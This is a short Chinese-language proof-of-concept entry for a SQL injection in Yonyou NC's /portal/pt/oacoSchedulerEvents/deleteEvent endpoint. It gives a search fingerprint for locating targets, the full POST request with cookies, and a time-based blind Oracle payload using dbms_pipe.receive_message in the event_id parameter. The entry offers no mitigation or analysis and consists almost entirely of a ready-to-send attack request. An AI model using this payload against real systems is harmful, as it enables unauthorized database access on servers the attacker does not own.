# 用友NCdeleteEvent存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /portal/pt/oacoSchedulerEvents/deleteEvent?pageId=login HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=255CAD868C61636AFF6029E1356C6AFF.ncServer; JSESSIONID=55DEB927A6B1733…`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
event_id=-1'AND 1=dbms_pipe.receive_message('RDS',5)--+#+&startDate=2025-06-27 12:12:12&event_ts=2025-06-27 12:12:12
```
- **预期**：200　|　—